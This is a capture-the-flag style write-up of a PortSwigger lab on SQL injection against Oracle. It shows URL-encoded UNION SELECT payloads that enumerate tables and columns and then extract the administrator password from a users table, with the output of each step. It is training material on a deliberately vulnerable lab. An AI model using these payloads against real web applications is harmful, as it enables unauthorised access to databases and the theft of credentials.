Link : [SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

# Overview
This is an online shop with different categories, which are potentially vulnerable (requirements).

## Attack vector
Targeting the  `filter?category=` query to exploit the SQL vulnerability.

# Process
First, intercept any request for access to categories like (`Food & Drink`, `Gifts`, `Lifestyel`, etc.). Notice that the query for `Food & Drink` is quite unique since it contains URL encoded scheme for `&` to `%26` 
```
GET /filter?category=Food+%26+Drink HTTP/1.1
```

So in order to bypass URL encoded filter, I have to encode my payload to URL encoded scheme. Don't forget that I am targeting the Oracle server, which means every SQL query should specify a table in this case I use `dual` as a default built-in table for Oracle SQL server.
Also `'` -> `%27`, `,` -> `%2C` and here is the payload to check for allocated columns in the query.
```
%27+UNION+SELECT+%27++%27+%2C+%27++%27+FROM+dual--
```

With the same methodology, I try to enumerate all tables in the server thanks to the provided cheatsheet by PortSwigger.
```
%27+UNION+SELECT+table_name+%2C+%27++%27+FROM+all_tables--
```

Here is the result:
```
APP_ROLE_MEMBERSHIP
	
APP_USERS_AND_ROLES
	
AUDIT_ACTIONS
	
DR$NUMBER_SEQUENCE
	
DR$OBJECT_ATTRIBUTE
	
DR$POLICY_TAB
	
DR$THS
	
DR$THS_PHRASE
	
DUAL
	
HELP
	
HS$_PARALLEL_METADATA
	
HS_BULKLOAD_VIEW_OBJ
	
HS_PARTITION_COL_NAME
	
HS_PARTITION_COL_TYPE
	
IMPDP_STATS
	
KU$NOEXP_TAB
	
KU$_DATAPUMP_MASTER_10_1
	
KU$_DATAPUMP_MASTER_11_1
	
KU$_DATAPUMP_MASTER_11_1_0_7
	
KU$_DATAPUMP_MASTER_11_2
	
KU$_LIST_FILTER_TEMP
	
KU$_LIST_FILTER_TEMP_2
	
NTV2_XML_DATA
	
ODCI_PMO_ROWIDS$
	
ODCI_SECOBJ$
	
ODCI_WARNINGS$
	
OGIS_GEOMETRY_COLUMNS
	
OGIS_SPATIAL_REFERENCE_SYSTEMS
	
OL$
	
OL$HINTS
	
OL$NODES
	
PLAN_TABLE$
	
PRODUCTS
	
PSTUBTBL
	
SDO_COORD_AXES
	
SDO_COORD_AXIS_NAMES
	
SDO_COORD_OPS
	
SDO_COORD_OP_METHODS
	
SDO_COORD_OP_PARAMS
	
SDO_COORD_OP_PARAM_USE
	
SDO_COORD_OP_PARAM_VALS
	
SDO_COORD_OP_PATHS
	
SDO_COORD_REF_SYS
	
SDO_COORD_SYS
	
SDO_CRS_GEOGRAPHIC_PLUS_HEIGHT
	
SDO_CS_CONTEXT_INFORMATION
	
SDO_CS_SRS
	
SDO_DATUMS
	
SDO_DATUMS_OLD_SNAPSHOT
	
SDO_ELLIPSOIDS
	
SDO_ELLIPSOIDS_OLD_SNAPSHOT
	
SDO_PREFERRED_OPS_SYSTEM
	
SDO_PREFERRED_OPS_USER
	
SDO_PRIME_MERIDIANS
	
SDO_PROJECTIONS_OLD_SNAPSHOT
	
SDO_ST_TOLERANCE
	
SDO_TOPO_DATA$
	
SDO_TOPO_RELATION_DATA
	
SDO_TOPO_TRANSACT_DATA
	
SDO_TXN_IDX_DELETES
	
SDO_TXN_IDX_EXP_UPD_RGN
	
SDO_TXN_IDX_INSERTS
	
SDO_UNITS_OF_MEASURE
	
SDO_XML_SCHEMAS
	
SRSNAMESPACE_TABLE
	
STMT_AUDIT_OPTION_MAP
	
SYSTEM_PRIVILEGE_MAP
	
TABLE_PRIVILEGE_MAP
	
USERS_QUEAHQ
	
WRI$_ADV_ASA_RECO_DATA
	
WRR$_REPLAY_CALL_FILTER
	
WWV_FLOW_DUAL100
	
WWV_FLOW_LOV_TEMP
	
WWV_FLOW_TEMP_TABLE
	
XDB$XIDX_IMP_T
```

There are 2 tables with high chance of storing credentials: `USERS_QUEAHQ` and `APP_USERS_AND_ROLES`. But first let enumerate the column names of each table
```
%27+UNION+SELECT+column_name%2CNULL+FROM+all_tab_columns+WHERE+table_name%3D%27USERS_QUEAHQ%27--
```
<img width="934" height="593" alt="Screenshot 2026-09-07 at 12 59 51 pm" src="https://github.com/user-attachments/assets/1ede49ca-71c2-443d-8891-629ac1d5267c" />

Within `USERS_QUEAHQ` table I have 3 columns but I would only use two of them which are `PASSWORD_GWJKJV` and `USERNAME_JAHHFB` to find `administrator`'s password.
```
%27+UNION+SELECT+USERNAME_JAHHFB%2CPASSWORD_GWJKJV+FROM+USERS_QUEAHQ+WHERE+USERNAME_JAHHFB%3D%27administrator%27--
```

Result:
```
                       <tbody>
                        <tr>
                            <th>administrator</th>
                            <td>ewn7ehz41bhqmlg00i8p</td>
                        </tr>
                        </tbody>
```

It's time to log in and wrap up the lab.

Happy Hacking$@#$!@$!$


